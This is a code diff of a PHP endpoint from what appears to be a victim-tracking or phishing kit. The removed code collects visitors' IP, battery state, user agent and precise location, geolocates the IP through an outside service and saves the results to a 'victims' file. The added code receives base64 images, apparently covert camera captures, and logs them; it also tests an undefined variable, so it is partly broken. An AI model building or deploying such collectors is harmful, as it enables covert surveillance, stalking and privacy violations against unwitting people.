@@ -1,84 +1,32 @@
-<?php 
-  header("Access-Control-Allow-Origin: 
-  *"); 
-  header("Access-Control-Allow-Methods: 
-  POST, GET, OPTIONS"); 
-  header("Access-Control-Allow-Headers: 
-  Content-Type"); $json = 
-  file_get_contents('php://input'); 
-  $jsondata = json_decode($json, 
-  true); $batdata = 
-  $jsondata['battery'] ?? null; 
-  $ip = 
-  $_SERVER['HTTP_CF_CONNECTING_IP']
-      ?? 
-      $_SERVER['HTTP_X_FORWARDED_FOR'] 
-      ?? $_SERVER['REMOTE_ADDR'] 
-      ?? 'unknown';
-  if (strpos($ip, ',') !== false) 
-  {
-    $ip = trim(explode(',', 
-    $ip)[0]);
+<?php
+  header("Access-Control-Allow-Origin: *");
+  header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
+  header("Access-Control-Allow-Headers: Content-Type");
+
+  if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
+      exit(0);
   }
-  $data = []; $ch = 
-  curl_init("http://ip-api.com/json/" 
-  . urlencode($ip)); 
-  curl_setopt($ch, 
-  CURLOPT_RETURNTRANSFER, true); 
-  curl_setopt($ch, 
-  CURLOPT_TIMEOUT, 5); $response = 
-  curl_exec($ch); curl_close($ch); 
-  if ($response) {
-    $data = json_decode($response, 
-    true) ?? [];
+
+  $raw_data = file_get_contents('php://input');
+  $_DATA = json_decode($raw_data, true) ?? $_POST; 
+
+  if (isset($_DATA['image'])) {
+    $data = $_DATA['image'];
+    $clean_b64 = str_replace('data:image/png;base64,', '', $data);
+    $clean_b64 = str_replace(' ', '+', $clean_b64);
+
+    $stdout = fopen('php://stdout', 'w');
+    fwrite($stdout, "[IMAGE_DATA]: " . $clean_b64 . "\n");
+    fclose($stdout);
+
+    if ($result !== false) {
+      echo json_encode(["status" => "success", "message" => "Image logged and saved"]);
+    } else {
+      http_response_code(500);
+      echo json_encode(["status" => "error", "message" => "Failed to save file on server"]);
+    }
+  } else {
+    http_response_code(400);
+    echo json_encode(["status" => "error", "message" => "No image data received"]);
   }
-  $lat = 
-  isset($jsondata['location']['lat']) 
-  ? $jsondata['location']['lat'] : 
-  ($data['lat'] ?? null); $lon = 
-  isset($jsondata['location']['lon']) 
-  ? $jsondata['location']['lon'] : 
-  ($data['lon'] ?? null); $info = 
-  array(
-    "UserAgent" => $jsondata['ua'] 
-    ?? 'N/A', "BatteryLevel" => 
-    $batdata['level'] ?? 'N/A', 
-    "ChargingStatus" => 
-    $batdata['charging'] ?? 'N/A', 
-    "IP" => $data['query'] ?? $ip, 
-    "Country" => $data['country'] 
-    ?? 'N/A', "CountryCode" => 
-    $data['countryCode'] ?? 'N/A', 
-    "City" => $data['city'] ?? 
-    'N/A', "Region" => 
-    $data['regionName'] ?? 'N/A', 
-    "RegionCode" => 
-    $data['region'] ?? 'N/A', 
-    "Latitude" => $lat ?? 'N/A', 
-    "Longitude" => $lon ?? 'N/A', 
-    "Maps" => ($lat && $lon) ? 
-    "https://www.google.com/maps?q=" 
-    . $lat . "," . $lon : 'N/A', 
-    "PostalCode" => $data['zip'] 
-    ?? 'N/A', "CountryFlag" => 
-    isset($data['countryCode']) ? 
-    "https://www.countryflags.io/" 
-    . $data['countryCode'] . 
-    "/flat/64.png" : 'N/A', "ASN" 
-    => $data['as'] ?? 'N/A', "ORG" 
-    => $data['org'] ?? 'N/A', 
-    "ISP" => $data['isp'] ?? 
-    'N/A', "UTC" => 
-    $data['timezone'] ?? 'N/A', 
-    "CurrentTime" => date('Y-m-d 
-    H:i:s')
-  ); $infosDir = 
-  "../../victims/infos"; $filepath 
-  = $infosDir . '/victims.json'; 
-  if (!file_exists($infosDir)) {
-    mkdir($infosDir, 0755, true);
-  }
-  file_put_contents($filepath, 
-  json_encode($info, 
-  JSON_PRETTY_PRINT));
 ?>
